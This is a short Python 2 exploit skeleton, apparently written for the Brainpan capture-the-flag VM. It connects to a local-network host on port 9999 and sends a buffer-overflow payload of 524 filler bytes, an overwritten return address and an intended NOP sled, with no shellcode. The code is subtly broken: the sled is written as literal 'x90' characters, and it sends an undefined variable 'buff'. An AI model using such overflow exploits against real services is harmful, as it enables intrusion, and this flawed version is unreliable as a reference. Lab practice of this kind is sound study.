#Brainpan skeleton

import socket

import sys

buf = "A" * 524 + '\xf3\x12\x17\x31' + 'x90' * 20

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:

	s.connect(('192.168.1.8', 9999))

except:

	print "Error"

	sys.exit(0)

s.recv(1024)

s.send(buff)